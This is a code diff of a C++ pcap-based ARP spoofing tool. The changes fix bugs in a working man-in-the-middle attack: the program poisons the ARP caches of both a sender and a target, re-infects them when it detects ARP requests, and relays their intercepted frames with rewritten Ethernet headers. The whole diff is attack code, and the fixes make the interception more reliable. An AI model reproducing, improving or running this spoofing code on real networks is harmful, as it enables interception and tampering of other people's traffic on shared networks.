@@ -11,7 +11,7 @@ void convert_argv_into_ip(uint8_t* IP, char* argv)
     char* IPstring = strdup(argv);
     char* p = strtok(IPstring, ".");
     int i = 0;
-    while(p != NULL)
+    while(p != nullptr)
     {
         IP[i] = strtoul(p, nullptr, 10);
         p = strtok(NULL, ".");
@@ -78,8 +78,8 @@ void get_node_MAC(pcap_t* fp, const uint8_t* attacker_MAC, const uint8_t* node_I
             if (res == -1 || res == -2) break;
 //            printf("%u bytes captured\n", header->caplen);
             arp_packet* arp_rep_packet = reinterpret_cast<arp_packet*>(const_cast<u_char*>(packet));
-            if ((memcmp(arp_rep_packet->arp_hdr.arp_tpa, arp_rep_packet->arp_hdr.arp_spa, 4) == 0 )
-                    && (ntohs(arp_rep_packet->eth_hdr.h_proto) == ETH_P_ARP)) //checking
+            if ((memcmp(&arp_req_packet.arp_hdr.arp_tpa, arp_rep_packet->arp_hdr.arp_spa, 4) == 0 )
+                    && (arp_rep_packet->eth_hdr.h_proto) == htons(ETH_P_ARP)) //checking
             {
                 memcpy(node_mac, arp_rep_packet->arp_hdr.arp_sha, 6);
                 return;
@@ -117,23 +117,30 @@ void arp_spoof(pcap_t* fp, uint8_t* sender_MAC, uint8_t* sender_IP, uint8_t* att
         if((pcap_sendpacket(fp, arp_to_send, sizeof(arp_to_send))) != 0)
             fprintf(stderr, "\nSending ARP_Request Failed");
         else
-            printf("Succeed: Sending ARP_Poison Packet.");
+            printf("Succeed: Sending ARP_Poison Packet.\n");
     }
 }
 
-void convert_relaying_packet(u_char* packet, uint8_t* attacker_mac, uint8_t* target_mac)
+void relaying_packet(pcap_t* fp, u_char* packet, u_int packet_len, uint8_t* attacker_mac, uint8_t* target_mac)
 {
     ethhdr eth_hdr;
-    memcpy(&eth_hdr.h_dest, target_mac, sizeof(eth_hdr.h_dest));
-    memcpy(&eth_hdr.h_source, attacker_mac, sizeof (eth_hdr.h_source));
-    memcpy(packet, &eth_hdr, sizeof(eth_hdr.h_dest) + sizeof(eth_hdr.h_source));
+    u_char* pckt_to_send = new u_char[packet_len];
+    memcpy(pckt_to_send, packet, packet_len);
+
+    memcpy(&eth_hdr.h_dest, target_mac, 6);
+    memcpy(&eth_hdr.h_source, attacker_mac, 6);
+    memcpy(pckt_to_send, &eth_hdr, 12);
+
+    if(pcap_sendpacket(fp, pckt_to_send, packet_len) != 0)
+        printf("Failed: Packet relaying.\n");
+    delete[] pckt_to_send;
 }
 
 void attack(argues args)
 {
     arp_spoof(args.fp, args.sender_mac, args.sender_IP, args.host_mac, args.target_IP); //1. arp spoofing
-
-    while(true) //2. capturing
+    arp_spoof(args.fp, args.target_mac, args.target_IP, args.host_mac, args.sender_IP);
+    while(true) //2. capturing~~~
     {
         struct pcap_pkthdr* header;
         const u_char* packet;
@@ -148,17 +155,24 @@ void attack(argues args)
         if(arp_pckt.eth_hdr.h_proto == htons(ETH_P_ARP) && arp_pckt.arp_hdr.ea_hdr.ar_op == htons(ARPOP_REQUEST) &&
                 memcmp(&arp_pckt.arp_hdr.arp_tpa, args.target_IP, 4) == 0)
         {
+           printf("Sender's ARP Request detected. Try to Reinfection...\n");
            arp_spoof(args.fp, args.sender_mac, args.sender_IP, args.host_mac, args.target_IP);
         }
         else
         {
-            if ( memcmp(&arp_pckt.eth_hdr.h_source, args.sender_IP, 4) == 0) //relaying (sender to target)
-                convert_relaying_packet(const_cast<u_char*>(packet), args.host_mac, args.target_mac);
-            else if ( memcmp(&arp_pckt.eth_hdr.h_source, args.target_IP, 4) == 0) // relaying (target to sender)
-                convert_relaying_packet(const_cast<u_char*>(packet), args.host_mac, args.sender_mac);
-
-            if(pcap_sendpacket(args.fp, packet, sizeof(packet)) != 0)
-                printf("Failed: Packet relaying.");
+            if ( memcmp(&(arp_pckt.eth_hdr.h_source), &(args.sender_mac), 6) == 0) //relaying (sender to target)
+            {
+                printf("DETECTED: sender to target packet detected.\n");
+                relaying_packet(args.fp, const_cast<u_char*>(packet), header->len, args.host_mac, args.target_mac);
+            }
+            else if ( memcmp(&(arp_pckt.eth_hdr.h_source), &(args.target_mac), 6) == 0) // relaying (target to sender)
+            {
+                printf("DETECTED: target to sender packet detected.\n");
+                relaying_packet(args.fp, const_cast<u_char*>(packet), header->caplen, args.host_mac, args.sender_mac);
+            }
+            else {
+                printf("Failed: Relaying packet.\n");
+            }
         }
     }
 }
